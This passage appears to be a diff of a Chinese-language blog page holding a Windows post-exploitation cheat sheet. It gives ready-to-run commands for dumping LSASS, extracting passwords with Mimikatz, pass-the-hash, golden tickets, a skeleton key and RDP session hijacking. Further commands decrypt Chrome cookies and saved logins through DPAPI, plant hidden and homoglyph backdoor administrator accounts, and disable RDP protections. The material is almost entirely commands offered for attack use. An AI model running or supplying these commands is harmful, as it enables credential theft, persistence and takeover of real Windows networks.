192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable</span><br><span class="line"></span><br><span class="line"># Fix CredSSP errors</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Disable NLA</span><br><span class="line">PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;).UserAuthenticationRequired</span><br><span class="line">PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;).SetUserAuthenticationRequired(0)</span><br><span class="line"></span><br><span class="line">3）Netuse</span><br><span class="line"></span><br><span class="line">PS C:\&gt; net use \\ordws01.cscou.lab /user:DOMAIN\username password C$</span><br><span class="line"></span><br><span class="line">4）Runas</span><br><span class="line"></span><br><span class="line">PS C:\&gt; runas /netonly /user:DOMAIN\username &quot;cmd.exe&quot;</span><br><span class="line">PS C:\&gt; runas /noprofil /netonly /user:DOMAIN\username cmd.exe</span><br></pre></td></tr></table></figure>
 
-2）rundll32
-
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
-
-3）Mimikatz
-
-mimikatz # sekurlsa::minidump lsass.dmp
-Switch to minidump
-mimikatz # sekurlsa::logonPasswords
-</code></pre>
-<h3 id="3-Mimikatz"><a href="#3-Mimikatz" class="headerlink" title="3. Mimikatz"></a>3. Mimikatz</h3><pre><code>1）Execute commands
-
-PS C:\temp\mimikatz&gt; .\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit # 单行
-
-PS C:\temp\mimikatz&gt; .\mimikatz  # 多行
-mimikatz # privilege::debug
-mimikatz # log
-mimikatz # sekurlsa::logonpasswords
-mimikatz # sekurlsa::wdigest
-
-2）Extract passwords
-
-mimikatz_command -f sekurlsa::logonPasswords full
-mimikatz_command -f sekurlsa::wdigest
-
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
-
-3）Pass The Hash
-
-mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell
-
-4）Golden ticket
-
-.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
-
-.\mimikatz &quot;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot; exit
-
-5）Skeleton key
-
-# map the share
-net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
-# login as someone
-rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
-
-6）RDP session takeover
-
-# get the Session ID you want to hijack
-query user
-create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#55&quot;
-net start sesshijack
-
-7）Chrome Cookies &amp; Credential
-
-# Saved Cookies
-dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Cookies&quot; /unprotect
-dpapi::chrome /in:&quot;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
-
-# Saved Credential in Chrome
-dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect
-</code></pre>
-<h3 id="4-DPAPI"><a href="#4-DPAPI" class="headerlink" title="4. DPAPI"></a>4. DPAPI</h3><pre><code>1) 显示凭据
-
-vaultcmd /list
-
-VaultCmd /listcreds:&lt;namevault&gt;|&lt;guidvault&gt; /all
-vaultcmd /listcreds:&quot;Windows Credentials&quot; /all
-
-2）列出凭据文件
-
-dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
-dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-
-Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-
-3）Mimikatz - Credential Manager &amp; DPAPI
-
-# check the folder to find credentials
-dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
-
-# check the file with mimikatz
-mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
-
-# find master key
-mimikatz !sekurlsa::dpapi
-
-# use master key
-mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
-
-# find and export backup keys
-lsadump::backupkeys /system:dc01.lab.local /export
-
-# use backup keys
-dpapi::masterkey /in:&quot;C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&quot; /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
-
-4）DonAPI - 远程转储
-
-DonPAPI.py domain/user:passw0rd@target
-DonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain/user@target
-
-# using domain backup key
-dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
-python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
-</code></pre>
-<h3 id="5-创建凭据"><a href="#5-创建凭据" class="headerlink" title="5. 创建凭据"></a>5. 创建凭据</h3><pre><code>net user hacker Hcker_12345678* /add /Y
-net localgroup administrators hacker /add
-net localgroup &quot;Remote Desktop Users&quot; hacker /add # RDP access
-net localgroup &quot;Backup Operators&quot; hacker /add # Full access to files
-net group &quot;Domain Admins&quot; hacker /add /domain
-
-# enable a domain user account
-net user hacker /ACTIVE:YES /domain
-
-# prevent users from changing their password
-net user username /Passwordchg:No
-
-# prevent the password to expire
-net user hacker /Expires:Never
-
-# create a machine account (not shown in net users)
-net user /add evilbob$ evilpassword
-
-# homoglyph Aԁmіnistratοr (different of Administrator)
-Aԁmіnistratοr
-</code></pre>
-<h3 id="6-凭据利用"><a href="#6-凭据利用" class="headerlink" title="6. 凭据利用"></a>6. 凭据利用</h3><pre><code>1）PsExec
-
-PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
-
-# switch admin user to NT Authority/System
-PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
-
-2）RDP协议
-
-# Enable RDP
-PS C:\&gt; reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
-PS C:\&gt; netsh firewall set service remoteadmin enable
-PS C:\&gt; netsh firewall set service remotedesktop enable
-# Alternative
-C:\&gt; psexec \\machinename reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0
-root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
-
-# Fix CredSSP errors
-reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f
-
-# Disable NLA
-PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName=&#39;RDP-tcp&#39;&quot;).UserAuthenticationRequired
-PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName=&#39;RDP-tcp&#39;&quot;).SetUserAuthenticationRequired(0)
-
-3）Netuse
-
-PS C:\&gt; net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
-
-4）Runas
-
-PS C:\&gt; runas /netonly /user:DOMAIN\username &quot;cmd.exe&quot;
-PS C:\&gt; runas /noprofil /netonly /user:DOMAIN\username cmd.exe
-</code></pre>
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/privilege-escalation">https://www.ired.team/offensive-security/privilege-escalation</a></li>
 <li><a target="_blank" rel="noopener" href="https://cheatsheet.haax.fr/windows-systems/privilege-escalation/">https://cheatsheet.haax.fr/windows-systems/privilege-escalation/</a></li>
